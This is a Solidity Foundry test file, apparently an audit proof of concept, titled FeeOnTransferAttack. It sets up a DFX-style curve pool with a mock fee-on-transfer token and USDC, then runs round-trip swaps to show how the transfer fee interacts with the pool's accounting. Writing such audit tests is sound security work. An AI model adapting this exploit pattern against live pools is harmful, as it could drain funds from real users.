// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "../src/interfaces/IAssimilator.sol";
import "../src/interfaces/IOracle.sol";
import "../src/interfaces/IERC20Detailed.sol";
import "../src/AssimilatorFactory.sol";
import "../src/CurveFactoryV2.sol";
import "../src/Curve.sol";
import "../src/Config.sol";
import "../src/Structs.sol";
import "../src/Zap.sol";
import "../src/lib/ABDKMath64x64.sol";

import "./lib/MockUser.sol";
import "./lib/CheatCodes.sol";
import "./lib/Address.sol";
import "./lib/CurveParams.sol";
import "./lib/MockChainlinkOracle.sol";
import "./lib/MockOracleFactory.sol";
import "./lib/MockToken.sol";

import "./utils/Utils.sol";

// attack added import
import "../src/ViewLiquidity.sol";
import "./MockFeeOnTransferERC20.sol";

contract FeeOnTransferAttack is Test {
    using SafeMath for uint256;
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    Utils utils;

    // account order is lp provider, trader, treasury
    MockUser[] public accounts;

    MockOracleFactory oracleFactory;
    // token order is gold, euroc, cadc, usdc
    IERC20Detailed[] public tokens;
    IOracle[] public oracles;
    Curve[] public curves;
    uint256[] public decimals;

    uint256[] public dividends = [20, 2];

    Config config;
    CurveFactoryV2 curveFactory;
    AssimilatorFactory assimFactory;

    function setUp() public {
        utils = new Utils();
        // create temp accounts
        for (uint256 i = 0; i < 4; ++i) {
            accounts.push(new MockUser());
        }
        // deploy the fee on transfer token and extract USDC from mainnet
        MockFeeOnTransferERC20 Fot = new MockFeeOnTransferERC20(1000); // 100 = 1%
        tokens.push(IERC20Detailed(address(Fot)));
        tokens.push(IERC20Detailed(Polygon.USDC));

        // deploy mock oracle factory for deployed token (named Fot)
        oracleFactory = new MockOracleFactory();
        oracles.push(
            oracleFactory.newOracle(
                address(tokens[0]),
                "FotOracle",
                9,
                10000000000 // @audit maybe 1:10 ratio here
            )
        );
        oracles.push(IOracle(Polygon.CHAINLINK_USDC));

        cheats.startPrank(address(accounts[2]));

        config = new Config(50000, address(accounts[2])); // accounts[2] is the treasury
        // deploy new assimilator factory & curveFactory v2
        assimFactory = new AssimilatorFactory(address(config));
        curveFactory = new CurveFactoryV2(
            address(assimFactory),
            address(config),
            Polygon.WMATIC
        );
        assimFactory.setCurveFactory(address(curveFactory));
        // now deploy curves

        CurveInfo memory curveInfo = CurveInfo(
            string(abi.encode("dfx-curve-FOT-USDC")),
            string(abi.encode("lp-FOT-USDC")),
            address(tokens[0]),
            address(tokens[1]),
            DefaultCurve.BASE_WEIGHT,
            DefaultCurve.QUOTE_WEIGHT,
            oracles[0],
            oracles[1],
            DefaultCurve.ALPHA,
            DefaultCurve.BETA,
            DefaultCurve.MAX,
            DefaultCurve.EPSILON,
            DefaultCurve.LAMBDA
        );
        Curve _curve = curveFactory.newCurve(curveInfo);
        curves.push(_curve);

        cheats.stopPrank();

        // now mint FOT tokens
        uint256 mintAmt = 300_000_000_000;
        decimals.push(utils.tenToPowerOf(tokens[0].decimals()));
        decimals.push(utils.tenToPowerOf(tokens[1].decimals()));

        tokens[0].mint(address(accounts[0]), mintAmt.mul(decimals[0]));
        deal(
            address(tokens[1]),
            address(accounts[0]),
            mintAmt.mul(decimals[1])
        );

        // now approve
        cheats.startPrank(address(accounts[0]));
        tokens[0].approve(address(curves[0]), type(uint).max);
        tokens[1].approve(address(curves[0]), type(uint).max);
        cheats.stopPrank();
    }

    function plog() public {
        console.log("---------------------");
        console.log(
            "Trader FOT balance : %d",
            tokens[0].balanceOf(address(accounts[1])) / decimals[0]
        );
        console.log(
            "Trader USDC balance : %d",
            tokens[1].balanceOf(address(accounts[1])) / decimals[1]
        );
        console.log(
            "Curve FOT balance : %d",
            tokens[0].balanceOf(address(curves[0])) / decimals[0]
        );
        console.log(
            "Curve USDC balance : %d",
            tokens[1].balanceOf(address(curves[0])) / decimals[1]
        );
    }

    function test__attack() public {
        uint256 mintAmount = 1200; // fee on transfer of FOT is 10 => 1% fee

        // mint FOT to trader
        tokens[0].mint(address(accounts[1]), mintAmount * decimals[0]);
        uint256 rawAmount = tokens[0].balanceOf(address(accounts[1]));

        cheats.startPrank(address(accounts[1]));
        tokens[0].approve(address(curves[0]), type(uint).max);
        tokens[1].approve(address(curves[0]), type(uint).max);
        cheats.stopPrank();

        // first deposit
        cheats.startPrank(address(accounts[0]));
        curves[0].deposit(
            20000000 * decimals[0],
            0,
            0,
            type(uint256).max,
            type(uint256).max,
            block.timestamp + 60
        );
        cheats.stopPrank();

        plog();

        cheats.startPrank(address(accounts[1]));
        curves[0].originSwap(
            address(tokens[0]),
            address(tokens[1]),
            (tokens[0].balanceOf(address(accounts[1])) / 12) * 10,
            0,
            block.timestamp + 60
        );
        cheats.stopPrank();

        plog();

        cheats.startPrank(address(accounts[1]));
        curves[0].originSwap(
            address(tokens[1]),
            address(tokens[0]),
            tokens[1].balanceOf(address(accounts[1])),
            0,
            block.timestamp + 60
        );
        cheats.stopPrank();

        plog();

        uint256 userFoTBal = tokens[0].balanceOf(address(accounts[1]));
        // normalise mintAmount with decimals
        mintAmount = mintAmount.mul(1e18);
        // amount of FoT first transferred from user to curve in the first swap, this includes 10% fee
        uint256 FoT1stSwapAmt = (((mintAmount / 12) * 10) * 10) / 9;
        // user FoT balance after first swap
        uint256 unchangedFotUserBalance = mintAmount - FoT1stSwapAmt;
        // since FoT is transferred 2 times in 2 sequent swaps, fee is applied twice, thus making it 81% of original
        uint256 userFoTBalEstimate = ((mintAmount - unchangedFotUserBalance) *
            81) /
            100 +
            unchangedFotUserBalance;
        userFoTBal = userFoTBal.div(1e18);
        userFoTBalEstimate = userFoTBalEstimate.div(1e18);
        assertApproxEqAbs(userFoTBal, userFoTBalEstimate, 1);
    }
}
